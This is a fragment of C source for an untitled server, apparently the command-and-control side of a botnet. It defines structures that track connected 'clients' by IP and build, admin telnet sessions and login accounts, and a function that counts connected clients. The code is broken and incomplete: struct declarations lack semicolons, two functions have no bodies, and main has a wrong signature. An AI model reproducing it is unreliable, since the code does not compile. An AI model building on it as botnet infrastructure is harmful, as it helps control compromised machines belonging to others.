/*

# ___     __________  ____ _______      _____ _______________.___.  ___     
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\ 
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/ 
#           |    |   \ |   /    |    \/    |    \    |   \\____   |          
#           |______  / |___\____|__  /\____|__  /____|_  // ______|          
#                  \/              \/         \/       \/ \/                 
						***UNTITLED SERVER.C***

*/

//*** INCLUDES ***
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

//*** DEFINES ***
#define CONNECTION_PORT 53
#define MAXFDS 1000000

//*** STRUCT ***
struct account {
	char id[20];
	char password[20];
}
static struct account accounts[10];

struct clientdata_t {
		uint32_t ip;
		char build[7];
		char connected;
} clients[MAXFDS]

struct telnetdata_t {
		int connected;
} managements[MAXFDS];

unsigned int ClientsConnected()
{
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++)
	{
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}


int Search_in_File(char *str)

//*** MAIN ***
int main(int argc, char *argv)